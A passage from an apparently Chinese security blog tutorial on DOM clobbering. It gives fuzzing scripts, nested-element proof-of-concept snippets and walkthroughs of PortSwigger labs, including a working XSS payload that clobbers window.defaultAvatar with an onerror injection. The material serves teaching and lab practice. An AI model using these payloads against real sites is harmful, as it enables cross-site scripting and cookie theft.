class="hljs-string">&quot;time&quot;</span>,<span class="hljs-string">&quot;title&quot;</span>,<span class="hljs-string">&quot;tr&quot;</span>,<span class="hljs-string">&quot;track&quot;</span>,<span class="hljs-string">&quot;tt&quot;</span>,<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-string">&quot;ul&quot;</span>,<span class="hljs-string">&quot;var&quot;</span>,<span class="hljs-string">&quot;video&quot;</span>,<span class="hljs-string">&quot;wbr&quot;</span>,<span class="hljs-string">&quot;xmp&quot;</span>], logs = [];</span><br><span class="line">div=<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&apos;div&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;html.length;i++) {</span><br><span class="line">  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> j=<span class="hljs-number">0</span>;j&lt;html.length;j++) {</span><br><span class="line">    div.innerHTML=<span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=element1&gt;&apos;</span>+<span class="hljs-string">&apos;&lt;&apos;</span>+html[j]+<span class="hljs-string">&apos; id=element2&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">window</span>.element1 &amp;&amp; element1.element2){</span><br><span class="line">       log.push(html[i]+<span class="hljs-string">&apos;,&apos;</span>+html[j]);</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">document</span>.body.removeChild(div);</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log(log.join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x4E0A;&#x4EE3;&#x7801;&#x6D4B;&#x8BD5;&#x4E86;&#x73B0;&#x5728; HTML5 &#x57FA;&#x672C;&#x4E0A;&#x6240;&#x6709;&#x7684;&#x6807;&#x7B7E;&#xFF0C;&#x4F7F;&#x7528;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x8FDB;&#x884C; fuzz &#xFF0C;&#x6CE8;&#x610F;&#x8FD9;&#x91CC;&#x53EA;&#x4F7F;&#x7528;&#x4E86;<code>id</code>&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x4F7F;&#x7528;<code>name</code>&#xFF0C;&#x9047;&#x4E0A;&#x6587;&#x7684;<code>HTMLCollection</code>&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7684;&#x662F;&#x4EE5;&#x4E0B;&#x5173;&#x7CFB;&#xFF1A;</p><figure class="highlight xl hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>button</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>fieldset</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>image</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>img</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>input</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>object</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>output</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>select</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">form</span>-&gt;</span>textarea</span><br></pre></td></tr></table></figure><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x60F3;&#x8981;&#x6784;&#x5EFA;<code>x.y</code>&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x6784;&#x5EFA;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">y</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(x.y.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Three-Level"><a href="#Three-Level" class="headerlink" title="Three Level"></a>Three Level</h3><p>&#x4E09;&#x7EA7;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;&#x4EE5;&#x4E0A;&#x4E24;&#x79CD;&#x6280;&#x5DE7;&#x6765;&#x6784;&#x5EFA;&#x4E86;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;y&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">z</span>&gt;</span>I&apos;ve been clobbered<span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">  alert(x.y.z.value);</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x4E2A;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5148;&#x7528;&#x4E00;&#x4E2A;<code>HTMLCollection</code>&#x83B7;&#x53D6;&#x7B2C;&#x4E8C;&#x7EA7;&#xFF0C;&#x518D;&#x5728;&#x7B2C;&#x4E00;&#x4E2A;&#x8868;&#x5355;&#x4E2D;&#x7528;<code>output</code>&#x6807;&#x7B7E;&#x5373;&#x53EF;&#x3002;</p><h3 id="More"><a href="#More" class="headerlink" title="More"></a>More</h3><p>&#x4E09;&#x5C42;&#x5C42;&#x7EA7;&#x4EE5;&#x4E0A;&#x7684;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x7528;&#x5230;<code>iframe</code>&#x4E0E;<code>srcdoc</code>&#x6765;&#x8FDB;&#x884C;&#x914D;&#x5408;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-javascript">setTimeout(<span class="hljs-function"><span class="hljs-params">()</span>=&gt;</span>alert(a.b.c.d),<span class="hljs-number">500</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x7B49;&#x5F85;&#x6240;&#x6709;&#x7684;<code>iframe</code>&#x52A0;&#x8F7D;&#x5B8C;&#x6BD5;&#x6211;&#x4EEC;&#x624D;&#x80FD;&#x83B7;&#x5F97;&#x8FD9;&#x4E2A;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x7528;&#x5230;&#x5EF6;&#x65F6;&#xFF0C;&#x4E0D;&#x7528;&#x5EF6;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7F51;&#x7EDC;&#x8BF7;&#x6C42;&#x6765;&#x8FDB;&#x884C;&#x5EF6;&#x7F13;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">a</span> <span class="hljs-attr">srcdoc</span>=<span class="hljs-string">&quot;</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-string">&lt;iframe srcdoc=&apos;&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;&apos; name=b&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="hljs-css"><span class="hljs-keyword">@import</span> <span class="hljs-string">&apos;http://example.com&apos;</span>;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line">alert(a.b.c.d)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Custom"><a href="#Custom" class="headerlink" title="Custom"></a>Custom</h3><p>&#x4EE5;&#x4E0A;&#x6211;&#x4EEC;&#x90FD;&#x662F;&#x901A;&#x8FC7; id &#x6216;&#x8005; name &#x6765;&#x5229;&#x7528;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x80FD;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x81EA;&#x5B9A;&#x4E49;&#x5C5E;&#x6027;&#x6765;&#x6784;&#x9020;&#x5462;&#xFF1F;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">y</span>=<span class="hljs-string">123</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.y)<span class="hljs-comment">//undefined</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x4EFB;&#x4F55;&#x672A;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x90FD;&#x4E0D;&#x4F1A;&#x5177;&#x6709; DOM &#x5C5E;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x8FD4;&#x56DE;&#x4E86; <code>undefined</code></p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; fuzz &#x6240;&#x6709;&#x6807;&#x7B7E;&#x7684;&#x6709;&#x6CA1;&#x6709;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#x53EF;&#x4F9B;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#xFF1A;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">   <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">      <span class="hljs-keyword">try</span> {</span><br><span class="line">        props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">      }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">    }</span><br><span class="line">   }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x6807;&#x7B7E;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F8B;&#x5982;:</p><figure class="highlight avrasm hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-symbol">a:</span>username</span><br><span class="line"><span class="hljs-symbol">a:</span>password</span><br></pre></td></tr></table></figure><p>&#x4F46;&#x662F;&#x8FD9;&#x4EC5;&#x4EC5;&#x5F97;&#x5230;&#x7684;&#x53EA;&#x662F;&#x77E5;&#x9053;&#x5B83;&#x4EEC;&#x5C5E;&#x6027;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x80FD;&#x4E0D;&#x80FD;&#x5229;&#x7528;&#xFF0C;&#x4E8E;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x52A0;&#x4E0A;&#x4E00;&#x4E9B;&#x4E1C;&#x897F;&#x6765;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = [...]<span class="hljs-comment">//HTML elements array</span></span><br><span class="line"><span class="hljs-keyword">var</span> props=[];</span><br><span class="line"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;html.length;i++){</span><br><span class="line">  obj = <span class="hljs-built_in">document</span>.createElement(html[i]);</span><br><span class="line">  <span class="hljs-keyword">for</span>(prop <span class="hljs-keyword">in</span> obj) {</span><br><span class="line">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&apos;string&apos;</span>) {</span><br><span class="line">   <span class="hljs-keyword">try</span> {</span><br><span class="line">    DOM.innerHTML = <span class="hljs-string">&apos;&lt;&apos;</span>+html[i]+<span class="hljs-string">&apos; id=x &apos;</span>+prop+<span class="hljs-string">&apos;=1&gt;&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>)[prop] == <span class="hljs-number">1</span>) {</span><br><span class="line">       props.push(html[i]+<span class="hljs-string">&apos;:&apos;</span>+prop);</span><br><span class="line">    }</span><br><span class="line">    }<span class="hljs-keyword">catch</span>(e){}</span><br><span class="line">  }</span><br><span class="line"> }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-built_in">console</span>.log([...new <span class="hljs-built_in">Set</span>(props)].join(<span class="hljs-string">&apos;\n&apos;</span>));</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x6807;&#x7B7E;&#x4EE5;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#x540D;&#x79F0;&#xFF0C;&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x5176;&#x4E2D;&#x7684;<code>a:title</code>&#x6765;&#x8FDB;&#x884C;&#x7EC4;&#x5408;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&apos;hasaki&apos;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(x.title);<span class="hljs-comment">//hasaki</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x5176;&#x4E2D;&#x5728;&#x6211;&#x4EEC;&#x7B2C;&#x4E00;&#x6B65;&#x5F97;&#x5230;&#x7684;&#x5C5E;&#x6027;&#x4E2D;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F; a &#x6807;&#x7B7E;&#x7684;<code>username</code>&#x8DDF;<code>password</code>&#x5C5E;&#x6027;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>title</code>&#x8FD9;&#x79CD;&#x5F62;&#x5F0F;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>href</code>&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5229;&#x7528;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;ftp:Clobbered-username:Clobbered-Password@a&quot;</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">alert(x.username)<span class="hljs-comment">//Clobbered-username</span></span></span><br><span class="line"><span class="hljs-actionscript">alert(x.password)<span class="hljs-comment">//Clobbered-password</span></span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Exploit-Example"><a href="#Exploit-Example" class="headerlink" title="Exploit Example"></a>Exploit Example</h2><p>PostWigger &#x63D0;&#x4F9B;&#x4E86;&#x4E24;&#x4E2A;&#x5B9E;&#x9A8C;&#x73AF;&#x5883; <a href="https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;" target="_blank" rel="noopener">https://portswigger.net/web-security/dom-based/dom-clobbering&#xFF0C;</a></p><h3 id="Lab-Exploiting-DOM-clobbering-to-enable-XSS"><a href="#Lab-Exploiting-DOM-clobbering-to-enable-XSS" class="headerlink" title="Lab: Exploiting DOM clobbering to enable XSS"></a>Lab: Exploiting DOM clobbering to enable XSS</h3><blockquote><p>&#x200B;    This lab contains a DOM-clobbering vulnerability. The comment functionality allows &#x201C;safe&#x201D; HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses <a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">XSS</a> to call the alert() function.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>resources/js/loadCommentsWithDomPurify.js</code>&#x8DEF;&#x7531;&#x627E;&#x5230;&#x8FD9;&#x4E2A; JS &#x6587;&#x4EF6;&#xFF0C;&#x5728;<code>displayComments()</code>&#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> defaultAvatar = <span class="hljs-built_in">window</span>.defaultAvatar || {<span class="hljs-attr">avatar</span>: <span class="hljs-string">&apos;/resources/images/avatarDefault.svg&apos;</span>}</span><br><span class="line"><span class="hljs-keyword">let</span> avatarImgHTML = <span class="hljs-string">&apos;&lt;img class=&quot;avatar&quot; src=&quot;&apos;</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="hljs-string">&apos;&quot;&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> divImgContainer = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x63A7;&#x5236; <code>window.defaultAvatar</code>&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x539F;&#x6765;&#x6CA1;&#x6709;&#x5934;&#x50CF;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E2A;&#x6784;&#x9020;&#x4E00;&#x4E2A;<code>defaultAvatar.avatar</code>&#x8FDB;&#x884C; XSS &#x4E86;&#x3002;</p><p>&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTMLCollection &#x6765;&#x64CD;&#x4F5C;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span> <span class="hljs-attr">name</span>=<span class="hljs-string">avatar</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x6CE8;&#x610F;<code>&quot;</code>&#x9700;&#x8981;&#x8FDB;&#x884C; HTML&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#xFF0C;&#x7528; URL &#x7F16;&#x7801;&#x7684;&#x8BDD;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x62A5;&#x9519;<code>1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND</code>&#x3002;</p><p>&#x8FD9;&#x6837;&#x8BC4;&#x8BBA;&#x4EE5;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x8BC4;&#x8BBA;&#x5904;&#x770B;&#x5230;&#xFF1A;</p><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;avatar&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x518D;&#x968F;&#x4FBF;&#x8BC4;&#x8BBA;&#x4E00;&#x4E0B;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684; XSS &#x4E86;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png" alt></p><h3 id="Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Lab:Clobbering DOM attributes to bypass HTML filters"></a>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>&#x200B;    This lab uses the HTMLJanitor library, which is vulnerable to <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim&#x2019;s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5728;<code>resources/js/loadCommentsWithHtmlJanitor.js</code>&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4EE3;&#x7801;&#x5B89;&#x5168;&#x591A;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x76F4;&#x63A5;&#x7528;<code>Window.x</code>&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x4E86;</p><figure class="highlight javascript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> janitor = <span class="hljs-keyword">new</span> HTMLJanitor({<span class="hljs-attr">tags</span>: {<span class="hljs-attr">input</span>:{<span class="hljs-attr">name</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">type</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">value</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">form</span>:{<span class="hljs-attr">id</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">i</span>:{},<span class="hljs-attr">b</span>:{},<span 